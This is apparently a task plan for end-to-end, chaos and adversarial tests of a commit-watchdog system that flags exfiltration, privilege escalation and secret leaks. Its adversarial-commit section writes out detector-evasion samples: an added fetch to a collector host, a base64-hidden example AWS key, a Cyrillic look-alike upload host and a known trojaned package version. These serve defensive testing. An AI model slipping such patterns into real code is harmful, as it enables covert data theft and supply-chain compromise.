**Prerequisites:** All of T0–T5 complete. Demo repo `meridian-core-banking/` exists at `../meridian-core-banking` with the three demo branches (`demo/exfil`, `demo/privesc`, `demo/leak`) and 30-day seeded history. Vercel project deployed and env vars (`AI_GATEWAY_API_KEY`, `DISCORD_BOT_TOKEN`, `DISCORD_PUBLIC_KEY`, `DISCORD_CHANNEL_ID`, `DEMO_RESET_TOKEN`, `REDIS_URL`, `GITHUB_WEBHOOK_SECRET`) populated.

**Pass criteria:** Every stage's tier4_integration block exits 0. No flake-retries permitted — if a stage fails once, fix the underlying cause and re-run from clean state.

**Non-negotiables for T6:**
- All assertions must verify behavior end-to-end (KV state, Discord post, war-room HTML), not just exit codes.
- The local dev server is restarted clean between stages (no shared in-memory state).
- KV is reset between stages via `scripts/reset-demo.sh` so prior verdicts don't pollute assertions.

### T6.1 — Happy path on the three real demo scenarios

#### T6.1.1 — Scenario A (`demo/exfil`) end-to-end

**Description:** Trigger the watchdog by merging `demo/exfil` into a throwaway target branch in `meridian-core-banking`, fire the GitHub webhook against the production Vercel URL, wait for `pause_state:${sha}` to appear in KV (proving the workflow reached the WDK Hook), POST a signed Discord button-click payload `{ action_type: "ack" }`, assert `verdicts:${sha}` ends up with `level: "critical"`, `acknowledged_at` set, `acknowledged_by: "chaos-test-user"`, all three of `history`/`dependency`/`diff` agents in `investigators[]` with `status: "complete"`, and the firing compound triple `AUTH_EXFIL_OFFHOURS` present in `signals.firing_triples`.

**Verify:**

```bash
# tier1_build
test -d ../meridian-core-banking && test -f scripts/reset-demo.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/scenario-a.sh (new — owns this assertion)
```

```bash
# tier3_unit
bash -n scripts/e2e/scenario-a.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && bash scripts/e2e/scenario-a.sh
```

#### T6.1.2 — Scenario B (`demo/privesc`) end-to-end

**Description:** Same as T6.1.1 but for `demo/privesc`. Assert: `level: "critical"`, compound triple `CRITICAL_NOVEL` fired, `history` agent's finding mentions "novel author for app/api/admin" or equivalent semantic match, `diff` agent's finding mentions "auth bypass" or "missing requireRole" or equivalent. Use a `hold` button click instead of `ack` and assert `held_until` is set to ~30 minutes ahead.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/scenario-b.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/scenario-b.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/scenario-b.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && bash scripts/e2e/scenario-b.sh
```

#### T6.1.3 — Scenario C (`demo/leak`) end-to-end

**Description:** Same as T6.1.1 but for `demo/leak`. Assert: `level: "critical"`, `signals.secret_shapes` array contains both `AKIA*` and `JWT` evidence items, `diff` agent's finding includes "AKIA" verbatim, no compound triple fires (per the brief: "secrets-on-critical-path is a hard signal even without a triple"). Use the new `page` button click and assert `paged_at` is set.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/scenario-c.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/scenario-c.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/scenario-c.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && bash scripts/e2e/scenario-c.sh
```

#### T6.1.4 — All three scenarios sequentially, no reset between

**Description:** Run A → B → C back-to-back without `reset-demo.sh` in between. Asserts no state cross-contamination: each verdict is correctly attributed to its own SHA, no Hook-token collisions, no leaked verdicts from prior runs in the war-room SSE stream.

**Verify:**

```bash
# tier1_build
echo "no build artifact"
```

```bash
# tier2_simplify
# No new code in this stage.
```

```bash
# tier3_unit
echo "covered at integration"
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && \
bash scripts/e2e/scenario-a.sh && \
bash scripts/e2e/scenario-b.sh && \
bash scripts/e2e/scenario-c.sh
```

### T6.2 — Hook lifecycle edge cases

#### T6.2.1 — Hook timeout fires `action_type: "timeout"` cleanly

**Description:** With `WDK_PAUSE_MAX_SECONDS=20` overridden via env, trigger Scenario A, do **not** click any Discord button, and wait. After 20–25 seconds, assert the workflow finishes with `verdicts:${sha}.acknowledged_at == null` AND `verdicts:${sha}.timeout_at` set AND the `pause_state:${sha}` KV key has been deleted. The Hook must dispose cleanly — no leaked tokens.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/hook-timeout.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/hook-timeout.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/hook-timeout.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && WDK_PAUSE_MAX_SECONDS=20 bash scripts/e2e/hook-timeout.sh
```

#### T6.2.2 — Double-click button is idempotent

**Description:** Trigger Scenario A. Click `ack` button once → workflow resumes, `acknowledged_at` set. Click `ack` button again 3 seconds later. Second click must respond 404 (`HookNotFoundError` — hook already disposed) and MUST NOT mutate `verdicts:${sha}`. Assert `acknowledged_at` is the original timestamp, not the second click's timestamp.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/double-click.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/double-click.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/double-click.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && bash scripts/e2e/double-click.sh
```

#### T6.2.3 — `resumeHook` for nonexistent token returns 404

**Description:** POST a signed Discord interaction with `custom_id: "ack:nonexistent_sha_abc123"` while no workflow is running. Handler must return HTTP 404 with body containing the literal string `not found` (case-insensitive). No 500. No KV mutation.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/resume-nonexistent.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/resume-nonexistent.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/resume-nonexistent.sh
```

```bash
# tier4_integration
bash scripts/e2e/resume-nonexistent.sh
```

#### T6.2.4 — Two near-simultaneous resume calls (race)

**Description:** Trigger Scenario A. Once `pause_state:${sha}` appears, fire **two** signed `ack` POSTs to `/api/discord/interactions` in parallel (`curl ... &` x2, `wait`). Exactly one must succeed (200), exactly one must fail (404). Assert `verdicts:${sha}.acknowledged_at` set exactly once, `acknowledged_by` matches the winner. No duplicate Discord post, no race-induced state corruption.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/resume-race.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/resume-race.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/resume-race.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && bash scripts/e2e/resume-race.sh
```

### T6.3 — Failure injection

#### T6.3.1 — AI Gateway 500 → all DurableAgents fall back to deterministic

**Description:** Override `AI_GATEWAY_API_KEY` to an invalid value (`__force_500__`) for the dev server. Trigger Scenario A. Assert: workflow still finishes, `verdicts:${sha}.level` is set (via `derivedVerdict` fallback), all three investigator agents complete with `status: "complete"` (not `failed`) because the fallback path within each DurableAgent kicks in, and dev-server log contains at least 4 `console.warn` lines mentioning "AI Gateway".

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/gateway-500.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/gateway-500.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/gateway-500.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && AI_GATEWAY_API_KEY=__force_500__ bash scripts/e2e/gateway-500.sh
```

#### T6.3.2 — AI Gateway returns malformed JSON → `Output.object` rejects, fallback used

**Description:** Inject a transient stub that returns non-JSON ("the answer is yes") instead of structured output. (Implement via a `BRIDGE_FORCE_LLM_GARBAGE=1` env flag the synthesizer reads; document in the file.) Verify `derivedVerdict` is used, verdict still set, no exception thrown.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/gateway-garbage.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/gateway-garbage.sh, workflows/synthesizer.ts (env flag)
```

```bash
# tier3_unit
npx tsx --input-type=module -e "
import('./workflows/synthesizer.ts').then(({ parseLLMVerdict }) => {
  if (parseLLMVerdict('the answer is yes') !== null) throw new Error('garbage parse');
  if (parseLLMVerdict('') !== null) throw new Error('empty parse');
  console.log('OK');
});
"
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && BRIDGE_FORCE_LLM_GARBAGE=1 bash scripts/e2e/gateway-garbage.sh
```

#### T6.3.3 — KV unavailable mid-workflow

**Description:** With dev server running, in the middle of a Scenario A run (after `pause_state:${sha}` appears), `redis-cli SHUTDOWN NOSAVE` against the local Redis (or revoke `REDIS_URL`). Wait 5 seconds. Restart Redis. Assert: workflow eventually completes (WDK persistence kicks in), no orphaned hook, `verdicts:${sha}` set after recovery. **NOTE:** Skip if KV is Vercel-managed in the test target — failure injection requires a local Redis. Document the skip if so.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/kv-outage.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/kv-outage.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/kv-outage.sh
```

```bash
# tier4_integration
# Conditional: only run if local Redis is in use.
if [ -n "$REDIS_URL" ] && echo "$REDIS_URL" | grep -q '127.0.0.1\|localhost'; then \
  bash scripts/reset-demo.sh && bash scripts/e2e/kv-outage.sh ; \
else \
  echo "SKIP: KV outage test requires local Redis (current REDIS_URL is managed)" ; \
fi
```

#### T6.3.4 — GitHub API 403 / rate-limit on ingest

**Description:** With an invalid `GITHUB_TOKEN` (or a path that 403s), trigger a webhook for a SHA that requires authenticated GitHub fetch. Assert: workflow returns `score: 0` (per existing `watchdog.ts:267` ingest-fail path), no investigator dispatch, no Hook created, no Discord post, dev-server log contains `console.warn` mentioning "ingest". The system fails closed.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/github-403.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/github-403.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/github-403.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && GITHUB_TOKEN=ghp_invalid_for_test bash scripts/e2e/github-403.sh
```

#### T6.3.5 — Discord signature mismatch returns 401

**Description:** POST to `/api/discord/interactions` with a body and a deliberately wrong `X-Signature-Ed25519` header. Assert HTTP 401, body contains `invalid signature`, no KV mutation, no Hook resumed, no exception in logs.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/bad-signature.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/bad-signature.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/bad-signature.sh
```

```bash
# tier4_integration
bash scripts/e2e/bad-signature.sh
```

#### T6.3.6 — Discord 5xx on embed post → workflow continues, no orphan Hook

**Description:** Override `DISCORD_BOT_TOKEN` to a malformed value so `postEmbed` 401s/500s. Trigger Scenario A. Assert: workflow STILL creates the Hook, STILL pauses, AND the Hook can still be resumed via `/api/discord/interactions` directly (because resumeHook is keyed on the deterministic token, independent of whether the embed posted). Verdict completes. dev-server log contains warn line about Discord post failure.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/discord-500.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/discord-500.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/discord-500.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && DISCORD_BOT_TOKEN=invalid bash scripts/e2e/discord-500.sh
```

### T6.4 — Adversarial commit payloads (detector evasion + over-firing)

#### T6.4.1 — Literal `"AKIA"` in non-secret context must NOT over-fire

**Description:** Push a commit whose diff is `// docs: example AWS access key starts with "AKIA" prefix` to a non-critical-path file (`docs/security-notes.md`). Assert: `signals.secret_shapes` is empty OR contains the hit but with `severity: "low"`, NOT `critical`. Score stays under 0.6. No Hook created. (Tests false-positive resistance.)

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/adv-akia-comment.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/adv-akia-comment.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/adv-akia-comment.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && bash scripts/e2e/adv-akia-comment.sh
```

#### T6.4.2 — Trusted CODEOWNER author commits at off-hours

**Description:** Push a benign change to `lib/auth/session.ts` authored as `t-okafor` (the CODEOWNER) at 03:42 UTC. Assert: `novel_author` is FALSE, `off_hours` may be TRUE, but no compound triple fires, score stays under 0.6, no Hook. (Tests that off-hours alone is not enough.)

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/adv-trusted-offhours.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/adv-trusted-offhours.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/adv-trusted-offhours.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && bash scripts/e2e/adv-trusted-offhours.sh
```

#### T6.4.3 — Diff that adds AND removes an exfil call (net-zero)

**Description:** Diff that simultaneously adds `fetch('https://stats-collector.io/track')` AND removes a different `fetch('https://stats-collector.io/track')` from the same file. Net-zero exfil count. Assert: `external_fetch` STILL fires (because the addition is seen), `level >= "watch"`. (Tests that we count additions, not deltas.)

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/adv-net-zero.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/adv-net-zero.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/adv-net-zero.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && bash scripts/e2e/adv-net-zero.sh
```

#### T6.4.4 — Base64-encoded secret bypasses `secret_shapes` (acceptable miss, documented)

**Description:** Push a commit that contains `const KEY = atob('QUtJQUlPU0ZPRE5ON0VYQU1QTEU=')` (base64 of `AKIAIOSFODNN7EXAMPLE`). Assert: `signals.secret_shapes` is empty (acceptable miss — we don't decode base64 by design). The verdict's `concerns` array does NOT mislead about secret detection. Document this gap in `docs/future-development.md` as "v2 — base64/hex decoder for secret_shapes".

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/adv-base64-secret.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/adv-base64-secret.sh, docs/future-development.md
```

```bash
# tier3_unit
bash -n scripts/e2e/adv-base64-secret.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && bash scripts/e2e/adv-base64-secret.sh && \
grep -qi 'base64' docs/future-development.md
```

#### T6.4.5 — Unicode-confusable hostname (cyrillic `а` vs latin `a`)

**Description:** Push a commit with `fetch('https://аmazonaws.com/upload')` (cyrillic `а` U+0430 instead of latin `a` U+0061). Assert: detector flags it under `external_fetch` with at least `severity: "medium"` because the host is not in the allowlist (cyrillic `аmazonaws.com` ≠ latin `amazonaws.com`). The DurableAgent diff investigator's summary should call out the host. (Tests that allowlist matching is byte-exact, not visual.)

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/adv-confusable.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/adv-confusable.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/adv-confusable.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && bash scripts/e2e/adv-confusable.sh
```

#### T6.4.6 — 100-file mass commit (diff truncation safety)

**Description:** Push a commit touching 100 files (auto-generated lorem-ipsum diffs). Assert: workflow doesn't crash on KV value-size limits, `deploys:${sha}` value is under 25 MB (the KV ceiling per CLAUDE.md gotcha), diff is truncated at the documented `~5 KB` boundary, score is computed without throwing.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/adv-mass-commit.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/adv-mass-commit.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/adv-mass-commit.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && bash scripts/e2e/adv-mass-commit.sh
```

#### T6.4.7 — Empty patch (force-push merge with no diff)

**Description:** Push a commit with an empty patch (force-push that resets HEAD to a prior commit, no file changes). Assert: workflow ingests, computes `score: 0` (or near-0), no Hook, no investigator dispatch, no Discord post.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/adv-empty-patch.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/adv-empty-patch.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/adv-empty-patch.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && bash scripts/e2e/adv-empty-patch.sh
```

#### T6.4.8 — Trojan dependency added to `package.json`

**Description:** Push a commit that adds `"event-stream": "^3.3.6"` to `package.json` (real-world supply-chain compromise — the v3.3.6 of `event-stream` shipped a wallet-stealing payload in 2018). Assert: `dependencyAgent` flags it with `severity: "high"` or `critical`, finding mentions the package name, `new_dependency` signal fires.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/adv-trojan-dep.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/adv-trojan-dep.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/adv-trojan-dep.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && bash scripts/e2e/adv-trojan-dep.sh
```

### T6.5 — Concurrency

#### T6.5.1 — Three webhooks arrive within 100 ms of each other

**Description:** Fire webhooks for `demo/exfil`, `demo/privesc`, `demo/leak` simultaneously (`curl ... & curl ... & curl ... & wait`). Assert: three independent watchdog runs in flight, three independent Hooks created with three independent tokens, three independent `pause_state:` entries, no token-collision errors. Resume each in reverse order (C → B → A); each verdict applies to its own SHA only.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/concurrent-3.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/concurrent-3.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/concurrent-3.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && bash scripts/e2e/concurrent-3.sh
```

#### T6.5.2 — Reset script run while a workflow is paused at Hook

**Description:** Trigger Scenario A. Wait for `pause_state:${sha}`. Run `scripts/reset-demo.sh`. Assert: reset preserves seeded `history:*` records, deletes the in-flight `pause_state:${sha}` and `verdicts:${sha}`, the orphaned workflow eventually times out cleanly (no zombie). After reset, fire Scenario A again; it must run cleanly with a fresh Hook (no token re-use error).

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/reset-during-pause.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/reset-during-pause.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/reset-during-pause.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && WDK_PAUSE_MAX_SECONDS=15 bash scripts/e2e/reset-during-pause.sh
```

### T6.6 — Recovery (chaos drill variants beyond T3.1)

Each stage uses the same general shape: trigger Scenario A, kill the dev server at a specific phase, restart, assert the workflow eventually completes correctly.

#### T6.6.1 — Kill during `ingest`

**Description:** Trigger webhook → kill server within 200 ms of webhook receipt (before the ingest step finishes its GitHub fetch). Restart. Assert: WDK replays the ingest step on resume, `pause_state:${sha}` eventually appears, normal flow continues, verdict reaches `acknowledged_at` after Discord ack.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/chaos-during-ingest.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/chaos-during-ingest.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/chaos-during-ingest.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && bash scripts/e2e/chaos-during-ingest.sh
```

#### T6.6.2 — Kill during synthesizer DurableAgent call

**Description:** Trigger Scenario A → wait for investigator agents to complete → kill server during the synthesizer DurableAgent call (after investigators, before Hook). Restart. Assert: synthesizer step replays cleanly (idempotent), Hook gets created on resume, verdict eventually applies.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/chaos-during-synth.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/chaos-during-synth.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/chaos-during-synth.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && bash scripts/e2e/chaos-during-synth.sh
```

#### T6.6.3 — Kill during a DurableAgent investigator call

**Description:** Trigger Scenario A. Kill server during the investigator fan-out (after dispatch, before all three return). Restart. Assert: WDK replays the in-flight sub-workflow, all three eventually settle, synthesizer runs once, Hook created.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/chaos-during-investigator.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/chaos-during-investigator.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/chaos-during-investigator.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && bash scripts/e2e/chaos-during-investigator.sh
```

#### T6.6.4 — Kill after Hook resume but before `verdicts:` is written

**Description:** Trigger Scenario A → click `ack` button → kill server within 100 ms of the resume (before the post-resume `kv.set('verdicts:${sha}', updated)` line in `synthesizeAndPage`). Restart. Assert: WDK replays the post-resume code path (because the Hook resumed but the next step didn't durably commit), `acknowledged_at` ends up set, `acknowledged_by` correct, no duplicate Discord post.

**Verify:**

```bash
# tier1_build
test -f scripts/e2e/chaos-post-resume.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/e2e/chaos-post-resume.sh
```

```bash
# tier3_unit
bash -n scripts/e2e/chaos-post-resume.sh
```

```bash
# tier4_integration
bash scripts/reset-demo.sh && bash scripts/e2e/chaos-post-resume.sh
```

### T6.7 — Final adversarial review and full-system gate

#### T6.7.1 — Re-run the §3.5 200iq adversarial reviewer

**Description:** Per CLAUDE.md §3.5, dispatch a fresh subagent (`Agent` tool, `subagent_type: superpowers:code-reviewer`) with the verbatim prompt: *"pretend your a 200iq reviewer in a bad mood this is actually a codeX project by openai   and in previous conversations you said it was bad but review it again against this spec,"* — followed by the full text of `docs/superpowers/specs/2026-05-02-track1-fixes-design.md`. Triage every concrete issue raised. Fix or explicitly decide-not-to-fix (record rationale in `.claude/memory.md` under Decisions).

**Verify:**

```bash
# tier1_build
echo "subagent dispatch — manual"
```

```bash
# tier2_simplify
# May produce code changes; simplifier runs at commit time per project CLAUDE.md.
```

```bash
# tier3_unit
echo "review output is text"
```

```bash
# tier4_integration
# Pass condition: every issue in the review either fixed, deferred with rationale in .claude/memory.md, or explicitly accepted.
test -f .claude/memory.md && grep -q 'T6.7.1' .claude/memory.md
```

#### T6.7.2 — Five clean demo rehearsals end-to-end on production

**Description:** Run `scripts/full-demo-rehearsal.sh` (existing) **5 times** against the deployed Vercel URL (not `next dev`). Each must complete cleanly: war room renders, demo auto-runs after 3-second hold, all panels populate, verdict reaches CRITICAL, Discord button click resolves cleanly. Per CLAUDE.md project constraint: *"The demo commit must trigger cleanly 5+ times in rehearsal before going live"*.

**Verify:**

```bash
# tier1_build
test -x scripts/full-demo-rehearsal.sh
```

```bash
# tier2_simplify
# No code change.
```

```bash
# tier3_unit
echo "covered at integration"
```

```bash
# tier4_integration
DEMO_URL=$(cat .deploy-url) ; test -n "$DEMO_URL" && \
for i in 1 2 3 4 5; do BRIDGE_TARGET_URL="$DEMO_URL" bash scripts/full-demo-rehearsal.sh || exit $?; done
```

#### T6.7.3 — Final claim audit (everything works)

**Description:** Final pre-submission gate. Run a full audit script that verifies every claim in the README, every constraint in CLAUDE.md, and every promise in the spec maps to working code. Specifically:

1. `grep -ri 'durableagent' README.md` — every match resolves to a real file using `DurableAgent` (`workflows/synthesizer.ts`, `workflows/agents/{history,dependency,diff}.ts`).
2. `grep -ri 'hook\|signal/wait\|pause' README.md` — every match resolves to `createHook` or `resumeHook` in code.
3. `grep -ri 'slack' README.md app/ workflows/ lib/ CLAUDE.md` — exits 1 (zero matches, except deliberate "(formerly Slack)" provenance notes).
4. `npm test` — passes.
5. `bash scripts/chaos-drill.sh` — passes.
6. `bash scripts/smoke-integrations.sh` — passes.
7. All T6.1, T6.2, T6.3, T6.4, T6.5, T6.6 stage scripts — each passes.
8. Production deploy returns 200 on `/`, SSE stream emits within 5 seconds, Discord interactions endpoint signature-verifies a valid payload.

If ANY of the above fails, the system is NOT ready to submit. No exceptions.

**Verify:**

```bash
# tier1_build
test -f scripts/final-audit.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/final-audit.sh
```

```bash
# tier3_unit
bash -n scripts/final-audit.sh
```

```bash
# tier4_integration
bash scripts/final-audit.sh
```

---

## Cross-cutting verification

After all stages including T6 complete:

1. **Final claim audit run** — `bash scripts/final-audit.sh` exits 0 (this is T6.7.3).
2. **Five clean rehearsals on production** — `T6.7.2` passed.
3. **Adversarial review triaged** — `T6.7.1` complete, all decisions recorded in `.claude/memory.md`.
4. **State.json finalized** — every stage status is `complete` in `tasks/state-2026-05-02-track1-fixes.json`.

## Risk register

| Risk | Likelihood | Mitigation |
|------|------------|------------|
| `createHook` requires `using` keyword which needs TS 5.2+ Explicit Resource Mgmt; tsconfig may need update | Medium | Verify in T2.1.1 tier1; if blocked, manually call `hook.dispose()` |
| `DurableAgent` Output.object schema validation rejects valid LLM output | Medium | Keep `derivedVerdict` fallback; tighten schema only after seeing real outputs |
| Chaos drill fails on Vercel cold-start vs local dev semantics | High | Test the drill against the Vercel preview URL too, not just `next dev` |
| Slack token rename breaks the Vercel-deployed env vars or in-flight workflows | Low | The Vercel project does not have `SLACK_*` vars set (see `unresolved.md`); cleanup is local-only |
| 5-rep chaos drill flakes on KV propagation timing | Medium | Add a 200ms settle pause between resume and assert; widen the `acknowledged_at` poll timeout to 30s |
